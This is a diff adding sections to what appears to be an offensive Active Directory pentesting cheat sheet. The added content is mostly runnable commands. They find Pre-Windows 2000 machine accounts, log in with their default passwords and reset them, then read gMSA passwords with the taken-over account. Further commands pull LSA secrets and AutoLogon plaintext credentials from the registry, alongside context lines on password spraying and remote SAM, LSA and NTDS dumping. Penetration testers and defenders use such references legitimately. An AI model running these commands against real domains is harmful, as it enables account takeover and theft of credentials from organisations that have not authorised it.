@@ -200,6 +200,29 @@ trevorspray -u users.txt -p 'Password2024!' --host <dc_ip> --lockout-threshold 3
 
 See `offensive-tools/windows/kerbrute/`, `offensive-tools/windows/trevorspray/`.
 
+### Pre-Windows 2000 machine account exploitation
+
+Machine accounts in the "Pre-Windows 2000 Compatible Access" group have default passwords set to lowercase machine name (without trailing `$`). If the machine was never domain-joined or its password never rotated, the default still works.
+
+```bash
+# Identify Pre-2000 members
+nxc ldap <dc_ip> -u user -p pass -d domain.local -M groupmembership -o USER='Pre-Windows 2000 Compatible Access'
+# Or via LDAP:
+ldapsearch -x -H ldap://<dc_ip> -D "user@domain.local" -w pass -b "DC=domain,DC=local" \
+  "(&(objectClass=computer)(memberOf=CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=domain,DC=local))" sAMAccountName userAccountControl
+
+# Test default password (machine "SRV01$" → password "srv01")
+nxc smb <dc_ip> -u 'SRV01$' -p 'srv01' -d domain.local
+
+# Change to controlled password via RPC-SAMR (requires valid domain user context)
+net rpc password 'SRV01$' 'NewPass123!' -U 'domain.local/user%pass' -S <dc_ip>
+
+# Or via impacket changepasswd
+impacket-changepasswd domain.local/'SRV01$':'srv01'@<dc_ip> -newpass 'NewPass123!'
+```
+
+**Impact**: machine accounts often have group memberships granting gMSA read, local admin on other hosts, or constrained delegation. Check `memberOf` immediately after takeover.
+
 ### LAPS & gMSA password extraction
 
 ```bash
@@ -210,6 +233,9 @@ nxc smb <subnet>/24 -u user -p pass --laps    # authenticate using LAPS password
 # gMSA — read managed service account passwords (requires ReadGMSAPassword)
 nxc ldap <dc_ip> -u user -p pass -M gmsa
 python3 gMSADumper.py -u user -p pass -d domain.local -l <dc_ip>
+
+# gMSA with machine account (common: Domain Secure Servers / Domain Controllers can read gMSA)
+nxc ldap <dc_ip> -u 'SRV01$' -p 'NewPass123!' -d domain.local --gmsa
 ```
 
 → Full LAPS/gMSA extraction patterns: `references/ad-enumeration.md`.
@@ -449,9 +475,20 @@ reg.exe save hklm\security C:\Windows\Temp\security.save
 # Crack offline:
 impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
 
+# LSA Secrets — high-value targets (from SECURITY + SYSTEM hive dump above):
+#   DefaultPassword  → AutoLogon plaintext credential (check Winlogon registry first)
+#   $MACHINE.ACC     → machine account NTLM hash (useful for S4U, relay)
+#   _SC_<svcname>    → service account passwords
+#   DPAPI_SYSTEM     → DPAPI master key decryption
+#   NL$KM            → cached domain logon encryption key
+# Check AutoLogon before hive dump (faster):
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
+
 # CrackMapExec — remote credential dump (SAM, LSA, NTDS)
 crackmapexec smb <target> -u admin -p pass --sam       # local SAM hashes
-crackmapexec smb <target> -u admin -p pass --lsa       # LSA secrets
+crackmapexec smb <target> -u admin -p pass --lsa       # LSA secrets (includes DefaultPassword)
 crackmapexec smb <dc_ip> -u admin -p pass --ntds       # NTDS.dit (DA required)
 ```
 
